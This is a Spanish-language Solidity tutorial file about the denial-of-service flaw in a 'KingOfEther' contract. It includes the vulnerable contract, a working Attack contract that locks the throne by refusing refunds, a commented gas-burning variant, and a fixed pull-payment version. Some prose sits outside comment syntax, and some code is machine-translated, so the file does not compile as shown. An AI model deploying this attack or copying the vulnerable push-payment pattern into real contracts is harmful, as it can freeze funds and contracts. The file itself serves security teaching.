// DENIAL OF SERVICE O DENEGACIÓN DE SERVICIO.
pragma solidity ^0.8.17;

Hay muchas formas de atacar un contrato inteligente para dejarlo inutilizable.
Una vulnerabilidad que presentamos aquí es la denegación de servicio al hacer que la función para enviar Ether falle.

/*
El objetivo de KingOfEther es convertirse en rey enviando más Ether que
el rey anterior. El rey anterior será reembolsado con la cantidad de Ether
el usuario envió.

¿Qué pasó?
El ataque se convirtió en el rey. Todo nuevo desafío para reclamar el trono será rechazado.
ya que el contrato de ataque no tiene una función de respaldo, negándose a aceptar el
Ether enviado desde KingOfEther antes de que se establezca el nuevo rey.
*/
contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }
// También puede realizar un DOS consumiendo todo el gas usando asertar.
    // Este ataque funcionará incluso si el contrato de llamada no se verifica
    // si la llamada fue exitosa o no.
    //
    // función () pago externo {
    // afirmar (falso);
    // }
 function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}

// TÉCNICAS PREVENTIVAS 
// Una forma de evitar esto es permitir que los usuarios retiren su Ether en lugar de enviarlo.
// Aquí hay un ejemplo.
/ SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
